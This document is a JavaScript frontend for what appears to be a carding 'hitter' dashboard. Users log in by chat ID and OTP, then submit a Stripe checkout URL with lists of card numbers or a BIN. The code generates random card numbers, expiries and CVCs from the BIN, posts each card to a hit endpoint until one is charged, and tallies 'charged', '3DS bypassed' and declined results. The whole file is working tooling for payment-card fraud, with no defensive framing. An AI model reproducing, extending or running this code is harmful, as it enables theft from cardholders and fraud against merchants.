// UI Elements
const loginModal = document.getElementById('login-modal');
const chatIdInput = document.getElementById('chat-id-input');
const otpInput = document.getElementById('otp-input');
const authError = document.getElementById('auth-error');

const mainHeader = document.getElementById('main-header');
const dashboardContent = document.getElementById('dashboard-content');
const userNameDisplay = document.getElementById('user-name');

const stripeUrlInput = document.getElementById('stripe-url');
const cardsInput = document.getElementById('cards-input');
const startBtn = document.getElementById('start-btn');
const logOutput = document.getElementById('log-output');
const resultsOverview = document.getElementById('results-overview');
const successOverlay = document.getElementById('success-overlay');

let activeGate = 'checkout';
let activeMode = 'cards'; // 'cards' or 'bin'
let stats = { total: 0, charged: 0, bypassed: 0, declined: 0 };
let currentChatId = '';

// --- INITIALIZATION (Check Session on Load) ---

window.onload = async () => {
    try {
        const res = await fetch('/api/check-session');
        const data = await res.json();
        if (data.success) {
            currentChatId = data.chat_id;
            showDashboard();
        }
    } catch (e) {
        // No session found, stay on login modal
    }
};

// --- AUTH FLOW ---

document.getElementById('send-otp-btn').onclick = async () => {
    const chatId = chatIdInput.value.trim();
    if (!chatId) return (authError.innerText = "Please enter your Chat ID");
    
    authError.innerText = "Sending code...";
    try {
        const res = await fetch('/api/send-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId })
        });
        const data = await res.json();
        if (data.success) {
            currentChatId = chatId;
            document.getElementById('auth-phase-1').style.display = 'none';
            document.getElementById('auth-phase-2').style.display = 'block';
            authError.innerText = "";
        } else {
            authError.innerText = data.message;
        }
    } catch (e) {
        authError.innerText = "Error connecting to server";
    }
};

document.getElementById('verify-otp-btn').onclick = async () => {
    const code = otpInput.value.trim();
    if (code.length < 6) return (authError.innerText = "Invalid code format");

    try {
        const res = await fetch('/api/verify-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: currentChatId, code: code })
        });
        const data = await res.json();
        if (data.success) {
            showDashboard();
        } else {
            authError.innerText = "Invalid verification code";
        }
    } catch (e) {
        authError.innerText = "Verification failed";
    }
};

function showDashboard() {
    loginModal.style.display = 'none';
    mainHeader.style.display = 'flex';
    dashboardContent.style.display = 'block';
    userNameDisplay.innerText = `User ID: ${currentChatId}`;
}

// --- GATE & MODE SWITCHING ---

document.querySelectorAll('.gate-card').forEach(card => {
    card.onclick = () => {
        document.querySelectorAll('.gate-card').forEach(c => c.classList.remove('active'));
        card.classList.add('active');
        activeGate = card.dataset.gate;
    };
});

document.getElementById('mode-cards-tab').onclick = () => {
    activeMode = 'cards';
    document.getElementById('mode-cards-tab').classList.add('active');
    document.getElementById('mode-bin-tab').classList.remove('active');
    document.getElementById('input-cards-area').style.display = 'block';
    document.getElementById('input-bin-area').style.display = 'none';
    startBtn.innerText = "🚀 Start Hitting";
};

document.getElementById('mode-bin-tab').onclick = () => {
    activeMode = 'bin';
    document.getElementById('mode-bin-tab').classList.add('active');
    document.getElementById('mode-cards-tab').classList.remove('active');
    document.getElementById('input-cards-area').style.display = 'none';
    document.getElementById('input-bin-area').style.display = 'block';
    startBtn.innerText = "✨ Charge with BIN";
};

// Logout Logic
document.querySelector('.profile-avatar').onclick = async () => {
  if (confirm("Do you want to logout?")) {
    await fetch('/api/logout', { method: 'POST' });
    location.reload();
  }
};

// --- HITTER LOGIC ---

startBtn.onclick = async () => {
    const url = stripeUrlInput.value.trim();
    let cards = [];

    if (activeMode === 'cards') {
        const text = cardsInput.value.trim();
        cards = text.split('\n').map(c => c.trim()).filter(c => c.length > 0);
    } else {
        const bin = document.getElementById('bin-input').value.trim();
        const amt = parseInt(document.getElementById('bin-amount').value) || 1;
        if (bin.length < 6) return alert("Invalid BIN");
        cards = generateCards(bin, amt);
    }
    
    if (!url || cards.length === 0) return alert("Please provide URL and Cards/BIN");
    
    resetStats();
    resultsOverview.style.display = 'block';
    startBtn.disabled = true;
    startBtn.innerText = "PROCESSING...";

    for (const card of cards) {
        stats.total++;
        updateStats();
        const startTime = performance.now();
        
        try {
            const res = await fetch('/api/hit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    url: url,
                    card: card,
                    gate: activeGate
                })
            });
            
            const data = await res.json();
            const endTime = performance.now();
            const elapsed = ((endTime - startTime) / 1000).toFixed(2);
            
            handleResult(card, data, elapsed);
            
            if (data.status === 'charged' || data.status === 'approved') {
                showSuccessNotification(data.message || "Charged Successfully");
                break; 
            }
        } catch (e) {
            handleResult(card, { status: 'error', message: 'Request Failed' }, "0.00");
        }
    }
    
    startBtn.disabled = false;
    startBtn.innerText = activeMode === 'bin' ? "✨ Charge with BIN" : "🚀 Start Hitting";
};

function handleResult(card, data, time) {
    const status = (data.status || 'error').toLowerCase();
    const msg = data.message || 'Unknown result';
    
    if (status === 'charged' || status === 'approved') stats.charged++;
    else if (status === '3ds' || msg.toLowerCase().includes('3d')) stats.bypassed++;
    else stats.declined++;
    
    addResultCard(card, status, msg, time);
    updateStats();
}

function addResultCard(card, status, msg, time) {
    const item = document.createElement('div');
    item.className = 'log-item-card';
    
    let statusClass = 'dead';
    let badgeText = status.toUpperCase();
    
    if (status === 'charged' || status === 'approved') {
        statusClass = 'charged';
        badgeText = "CHARGED";
    } else if (status === '3ds') {
        statusClass = '3ds';
        badgeText = "3DS BYPASSED";
    }

    item.innerHTML = `
        <div class="row-header">
            <div class="row-card-info">
                <span>💳</span> ${maskCard(card)}
            </div>
            <div class="row-status-badge bg-${statusClass}">${badgeText}</div>
        </div>
        <div class="status-msg text-${statusClass}">${msg}</div>
        <div class="row-time">${time}s</div>
    `;
    logOutput.prepend(item);
}

function showSuccessNotification(message) {
    document.getElementById('notif-message').innerText = message;
    successOverlay.classList.add('show');
    setTimeout(() => successOverlay.classList.remove('show'), 5000);
}

function generateCards(bin, count) {
    const cards = [];
    for (let i = 0; i < count; i++) {
        let card = bin;
        while (card.length < 16) card += Math.floor(Math.random() * 10);
        const mm = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
        const yy = Math.floor(Math.random() * 5) + 25; // 2025-2029
        const cvc = Math.floor(Math.random() * 900) + 100;
        cards.push(`${card}|${mm}|${yy}|${cvc}`);
    }
    return cards;
}

function resetStats() {
    stats = { total: 0, charged: 0, bypassed: 0, declined: 0 };
    logOutput.innerHTML = "";
}

function updateStats() {
    document.getElementById('stat-total').innerText = `${stats.total} total`;
    document.getElementById('stat-charged').innerText = `${stats.charged} Charged`;
    document.getElementById('stat-3ds').innerText = `${stats.bypassed} 3DS Bypassed`;
    document.getElementById('stat-declined').innerText = `${stats.declined} Declined`;
}

function maskCard(card) {
    const parts = card.split('|');
    const p = parts[0];
    const masked = p.length > 6 ? `******${p.substring(6)}` : p;
    return `${masked}|${parts[1]}|${parts[2]}|${parts[3]}`;
}
